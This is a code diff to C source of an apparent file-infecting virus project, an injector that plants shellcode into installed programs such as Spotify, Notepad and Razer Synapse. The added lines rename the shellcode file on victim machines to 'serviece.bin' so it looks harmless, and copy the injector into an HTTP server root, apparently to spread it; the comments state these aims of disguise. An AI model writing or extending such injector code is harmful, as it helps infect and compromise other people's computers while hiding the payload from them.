@@ -12,7 +12,13 @@
 #define SUCCESS 0
 
 // Binary file.
-#define SHELLCODE_PATH "C:\\Users\\User\\source\\repos\\virus\\shellcode\\shellcode.bin"
+// to use from here change the define to SHELLCODE_PATH "C:\\Users\\User\\source\\repos\\virus\\shellcode\\shellcode.bin"
+// it will be the shellcode file name in the program infected computer, so it have to be not sus.
+#define SHELLCODE_PATH "serviece.bin"
+
+#define CURRENT_EXE_PATH "C:\\Users\\User\\source\\repos\\virus\\Debug\\injector.exe"
+#define EXE_LOCATION_HTTP_SERVER "C:\\Users\\User\\source\\repos\\virus\\http_server\\wwwroot\\injector.exe"
+
 #define SPOTIFY_PATH "C:\\Users\\User\\AppData\\Roaming\\Spotify\\Spotify.exe"
 #define NOTEPAD_PATH "C:\\Windows\\SysWOW64\\notepad.exe"
 #define RAZER_PATH "C:\\Program Files (x86)\\Razer\\Synapse3\\WPFUI\\Framework\\Razer Synapse 3 Host\\Razer Synapse 3.exe"
@@ -89,6 +95,9 @@ int main()
 {
     // Restarting the infected file to original.
     CopyFileA(MSGBOX_CPY_PATH, MSGBOX_PATH, FALSE);
+
+    // Copy new exe to server root directory keep the injector.
+    CopyFileA(CURRENT_EXE_PATH, EXE_LOCATION_HTTP_SERVER, FALSE);
 
     int result = SUCCESS;
     EXE_file* infected = NULL;
